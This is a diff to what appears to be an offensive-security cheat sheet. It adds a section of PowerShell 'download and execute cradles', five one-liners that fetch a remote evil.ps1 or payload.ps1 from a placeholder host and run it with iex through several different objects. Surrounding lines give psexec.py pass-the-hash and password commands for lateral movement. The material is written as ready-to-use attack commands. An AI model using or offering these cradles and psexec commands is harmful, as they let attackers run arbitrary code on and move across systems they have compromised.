@@ -57,6 +57,25 @@ python3 psexec.py -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME>@<TARGET>
 python3 psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
 ```
 
+#### Download and execute cradle
+```
+iex (New-Object Net.WebClient).DownloadString('https://xx.xx.xx.xx/payload.ps1')
+
+$ie=New-Object -ComObjectInternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://xx.xx.xx.xx/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
+
+#PSv3 onwards
+
+iex (iwr 'http://xx.xx.xx.xx/evil.ps1')
+
+$h=New-Object -ComObject
+Msxml2.XMLHTTP;$h.open('GET','http://xx.xx.xx.xx/evil.ps1',$false);$h.send();iex
+$h.responseText
+
+$wr = [System.NET.WebRequest]::Create("http://xx.xx.xx.xx/evil.ps1")
+$r = $wr.GetResponse()
+IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+```
+
 # Local privilege escalation
 Focussing on Service issues
 #### Privesc check all
